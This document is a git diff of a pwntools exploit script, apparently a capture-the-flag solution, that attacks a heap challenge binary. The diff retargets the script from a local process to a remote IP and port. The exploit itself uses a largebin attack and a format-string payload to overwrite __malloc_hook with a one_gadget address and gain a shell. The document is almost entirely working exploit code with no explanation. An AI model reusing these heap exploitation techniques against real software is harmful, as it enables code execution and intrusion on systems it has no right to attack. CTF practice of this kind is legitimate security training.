@@ -5,8 +5,8 @@ from pwn import *
 e = ELF('./cockarocha')
 libc = ELF('./libcs-2.31.so')
 
-p = process(e.path)
-#p = remote()
+#p = process(e.path)
+p = remote('159.89.254.233', 31783)
 
 #funcs
 
@@ -39,19 +39,19 @@ def ex():
 
 arena_off = libc.sym['main_arena']
 mp_off = libc.sym['mp_']
-freehook_off = libc.sym['__malloc_hook']
+mallochook_off = libc.sym['__malloc_hook']
 onegadget_off = 0xe6d60
 
 log.info('Arena libc off: ' + hex(arena_off))
 log.info('Mp libc off: ' + hex(mp_off))
-log.info('Freehook libc off: ' + hex(freehook_off))
+log.info('Mallochook libc off: ' + hex(mallochook_off))
 log.info('Onegadget libc off: ' + hex(onegadget_off))
 
 #exploit
 
 #start setup largbin attack while also leaving room for fake fmtstr and tcache indices
 
-add(0, 0x527 + 0xa20)
+add(0, 0x527 + 0xa020)
 add(1, 0x507)
 add(2, 0x517)
 add(3, 0x507)
@@ -67,7 +67,7 @@ log.info('Libc off adr: ' + hex(libc_off))
 #continue largebin attack setup and add the extra room chunk
 
 
-add(4, 0xa17) #this is chnk used for room which moves unsorted forward
+add(4, 0xa017) #this is chnk used for room which moves unsorted forward
 add(5, 0x537)
 
 fre(2)
@@ -82,22 +82,25 @@ fre(2)
 #fmtstr data
 
 s = b''
-for i in range(1, 0x100):
+for i in range(0x1, 0x400):
     s += b'%*' + str(i).encode() + b'$p'
 
 #tcache data
 
-s = s.ljust(0x9d8, b'\x00')
-s += p64(libc_off + freehook_off - 0xe * 8)
+#s = s.ljust(0x9d8, b'\x00')
+#s += p64(libc_off + mallochook_off - 0xe * 8)
+
+s += b'\x00' * (8 - len(s) % 8)
+s += p64(libc_off + mallochook_off - 0xe * 8) * ((0xa018 - len(s)) // 8)
 
 #largebin data
 
-s = s.ljust(0xa18, b'\x00')
+s = s.ljust(0xa018, b'\x00')
 s += p64(0x531)
 s += p64(libc_off + arena_off + 0x490) * 2
 s += b'a' * 0x8
 s += p64(libc_off + mp_off + 0x50 - 0x20)
-
+#gdb.attach(p)
 chg(libc_off + onegadget_off, 0, s)
 
 #pray for flag
